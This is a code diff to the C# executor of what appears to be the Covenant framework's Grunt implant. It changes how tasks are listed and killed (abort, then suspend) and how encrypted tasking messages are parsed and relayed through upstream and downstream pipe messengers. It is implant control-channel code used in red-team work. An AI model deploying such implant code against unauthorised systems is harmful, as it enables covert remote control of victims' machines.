@@ -143,26 +143,31 @@ namespace GruntExecutor
                             }
                             else if(message.Type == GruntTaskingType.Tasks)
                             {
-                                if (!Tasks.Where(J => J.Value.IsAlive).Any()) { output += "No active tasks!"; }
+                                if (!Tasks.Where(T => T.Value.ThreadState == ThreadState.Running).Any()) { output += "No active tasks!"; }
                                 else
                                 {
                                     output += "Task       Status" + Environment.NewLine;
                                     output += "----       ------" + Environment.NewLine;
-                                    output += String.Join(Environment.NewLine, Tasks.Where(T => T.Value.IsAlive).Select(T => T.Key + " Active").ToArray());
+                                    output += String.Join(Environment.NewLine, Tasks.Where(T => T.Value.ThreadState == ThreadState.Running).Select(T => T.Key + " Active").ToArray());
                                 }
                                 messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                             }
                             else if(message.Type == GruntTaskingType.TaskKill)
                             {
-                                var matched = Tasks.Where(T => T.Value.IsAlive && T.Key.ToLower() == message.Message.ToLower());
+                                var matched = Tasks.Where(T => T.Value.ThreadState == ThreadState.Running && T.Key.ToLower() == message.Message.ToLower());
                                 if (!matched.Any())
                                 {
-                                    output += "No task with name: " + message.Message;
+                                    output += "No active task with name: " + message.Message;
                                 }
                                 else
                                 {
                                     KeyValuePair<string, Thread> t = matched.First();
                                     t.Value.Abort();
+                                    Thread.Sleep(3000);
+                                    if (t.Value.IsAlive)
+                                    {
+                                        t.Value.Suspend();
+                                    }
                                     output += "Task: " + t.Key + " killed!";
                                 }
                                 messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
@@ -335,12 +340,24 @@ namespace GruntExecutor
         }
     }
 
+    public enum MessageType
+    {
+        Read,
+        Write
+    }
+
+    public class ProfileMessage
+    {
+        public MessageType Type { get; set; }
+        public string Message { get; set; }
+    }
+
     public interface IMessenger
     {
         string Hostname { get; }
         string Identifier { get; set; }
         string Authenticator { get; set; }
-        string Read();
+        ProfileMessage Read();
         void Write(string Message);
         void Close();
     }
@@ -386,12 +403,7 @@ namespace GruntExecutor
     public class TaskingMessenger
     {
         private object _UpstreamLock = new object();
-        private IMessenger _UpstreamMessenger;
-        private IMessenger UpstreamMessenger
-        {
-            get { return this._UpstreamMessenger; }
-            set { this._UpstreamMessenger = value; }
-        }
+        private IMessenger UpstreamMessenger { get; set; }
         private object _MessageQueueLock = new object();
         private Queue<string> MessageQueue { get; } = new Queue<string>();
 
@@ -409,16 +421,24 @@ namespace GruntExecutor
 
         public GruntTaskingMessage ReadTaskingMessage()
         {
-            string read = "";
+            ProfileMessage readMessage = null;
             lock (_UpstreamLock)
             {
-                read = this.UpstreamMessenger.Read();
+                readMessage = this.UpstreamMessenger.Read();
             }
-            if (read == null)
+            if (readMessage == null)
             {
                 return null;
             }
-            GruntEncryptedMessage gruntMessage = this.Profile.ParseReadFormat(read);
+            GruntEncryptedMessage gruntMessage = null;
+            if (readMessage.Type == MessageType.Read) 
+            {
+                gruntMessage = this.Profile.ParseReadFormat(readMessage.Message);
+            }
+            else if (readMessage.Type == MessageType.Write)
+            {
+                gruntMessage = this.Profile.ParseWriteFormat(readMessage.Message);
+            }
             if (gruntMessage == null)
             {
                 return null;
@@ -490,10 +510,10 @@ namespace GruntExecutor
                 {
                     try
                     {
-                        string read = downstream.Read();
+                        ProfileMessage read = downstream.Read();
                         if (downstream.Identifier == "")
                         {
-                            GruntEncryptedMessage message = this.Profile.ParseWriteFormat(read);
+                            GruntEncryptedMessage message = this.Profile.ParseWriteFormat(read.Message);
                             if (message.GUID.Length == 20)
                             {
                                  downstream.Identifier = message.GUID.Substring(10);
@@ -503,7 +523,7 @@ namespace GruntExecutor
                                 downstream.Identifier = message.GUID;
                             }
                         }
-                        this.UpstreamMessenger.Write(read);
+                        this.UpstreamMessenger.Write(read.Message);
                     }
                     catch (ThreadAbortException)
                     {
@@ -584,9 +604,9 @@ namespace GruntExecutor
             this.Pipe = ClientPipe;
         }
 
-        public string Read()
+        public ProfileMessage Read()
         {
-            return Common.GruntEncoding.GetString(this.ReadBytes());
+            return new ProfileMessage { Type = MessageType.Read, Message = Common.GruntEncoding.GetString(this.ReadBytes()) };
         }
 
         public void Write(string Message)
